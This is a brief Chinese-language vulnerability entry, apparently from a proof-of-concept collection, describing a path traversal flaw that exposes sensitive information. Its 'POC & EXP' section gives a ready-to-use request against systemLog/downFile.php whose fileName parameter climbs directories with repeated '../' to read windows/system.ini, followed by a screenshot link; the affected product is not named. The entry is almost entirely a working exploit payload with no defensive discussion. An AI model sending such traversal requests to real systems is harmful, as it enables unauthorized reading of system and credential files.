### 描述
通过文件遍历漏洞获取敏感信息

### POC & EXP
```
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
```
![hiv-6.png](https://i.loli.net/2021/04/19/oU2pn6mOaNY5DIV.png)
